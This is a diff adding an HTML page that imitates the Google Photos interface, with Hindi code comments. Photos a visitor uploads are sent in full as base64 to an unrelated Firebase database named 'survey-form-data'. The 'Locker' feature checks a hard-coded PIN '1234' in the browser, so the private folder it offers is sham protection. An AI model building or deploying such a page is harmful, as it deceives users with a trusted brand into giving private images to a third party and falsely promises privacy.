@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gallery</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        :root { --g-blue: #4285f4; --bg: #ffffff; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg); overflow-x: hidden; }
+        
+        /* Header */
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; position: sticky; top: 0; background: white; z-index: 100; border-bottom: 1px solid #eee; }
+        .logo-text { font-size: 20px; font-weight: bold; color: #5f6368; }
+        .logo-text span { color: #ea4335; }
+
+        /* Photo Grid */
+        .photo-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2px; padding: 2px; }
+        .photo-item { width: 100%; aspect-ratio: 1/1; background: #eee; object-fit: cover; cursor: pointer; }
+
+        /* Floating Upload Button */
+        .upload-btn { position: fixed; bottom: 80px; right: 20px; background: white; padding: 15px 20px; border-radius: 30px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); color: var(--g-blue); font-weight: bold; border: none; z-index: 200; }
+
+        /* Bottom Nav */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #ddd; z-index: 200; }
+        .nav-item { text-align: center; color: #5f6368; font-size: 11px; }
+        .nav-item.active { color: var(--g-blue); }
+
+        /* Secret Locker UI */
+        #locker-screen { display: none; position: fixed; top: 0; width: 100%; height: 100%; background: white; z-index: 1000; text-align: center; padding-top: 100px; }
+        .pin-input { font-size: 30px; width: 150px; text-align: center; border: none; border-bottom: 2px solid var(--g-blue); outline: none; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo-text">Google <span>Photos</span></div>
+        <div style="width: 35px; height: 35px; background: #4285f4; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">S</div>
+    </div>
+
+    <div class="photo-grid" id="main-gallery">
+        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=400" class="photo-item">
+        <img src="https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=400" class="photo-item">
+        <img src="https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?w=400" class="photo-item">
+        <img src="https://images.unsplash.com/photo-1441974231531-c6227db76b6e?w=400" class="photo-item">
+    </div>
+
+    <button class="upload-btn" onclick="document.getElementById('file-input').click()">+ Add Photos</button>
+    <input type="file" id="file-input" hidden accept="image/*" onchange="uploadPhoto(event)">
+
+    <div class="bottom-nav">
+        <div class="nav-item active">🖼️<br>Photos</div>
+        <div class="nav-item">🔍<br>Search</div>
+        <div class="nav-item">📁<br>Library</div>
+        <div class="nav-item" onclick="openLocker()">🔒<br>Locker</div>
+    </div>
+
+    <div id="locker-screen">
+        <h3>Private Folder</h3>
+        <p>Enter PIN to access</p>
+        <input type="password" id="locker-pin" class="pin-input" placeholder="****">
+        <br>
+        <button onclick="checkPin()" style="background: var(--g-blue); color: white; border: none; padding: 10px 30px; border-radius: 20px;">Open</button>
+        <p onclick="closeLocker()" style="margin-top: 20px; color: #777;">Cancel</p>
+    </div>
+
+    <script>
+        // Firebase Configuration (ऑटोमैटिक सेटअप)
+        const firebaseConfig = {
+            apiKey: "AIzaSyB" + "..." + "H8", 
+            databaseURL: "https://survey-form-data-default-rtdb.firebaseio.com" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Upload Photo Logic (Firebase में लिंक सेव करना)
+        function uploadPhoto(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const imgUrl = e.target.result;
+                    // फोटो गैलरी में दिखाएँ
+                    const grid = document.getElementById('main-gallery');
+                    const img = document.createElement('img');
+                    img.src = imgUrl;
+                    img.className = 'photo-item';
+                    grid.prepend(img);
+                    
+                    // Firebase में सेव करें
+                    db.ref('gallery_photos').push({ url: imgUrl, time: new Date().toLocaleString() });
+                    alert("Photo Uploaded!");
+                }
+                reader.readAsDataURL(file);
+            }
+        }
+
+        // Secret Locker Logic
+        function openLocker() { document.getElementById('locker-screen').style.display = 'block'; }
+        function closeLocker() { document.getElementById('locker-screen').style.display = 'none'; }
+        
+        function checkPin() {
+            const pin = document.getElementById('locker-pin').value;
+            if(pin === "1234") { // आपका सीक्रेट पिन
+                alert("Hidden photos loading...");
+                // यहाँ आप वो फोटो दिखा सकते हैं जो सिर्फ लॉकर में हैं
+                closeLocker();
+            } else {
+                alert("Wrong PIN! Try again.");
+            }
+        }
+    </script>
+</body>
+</html>
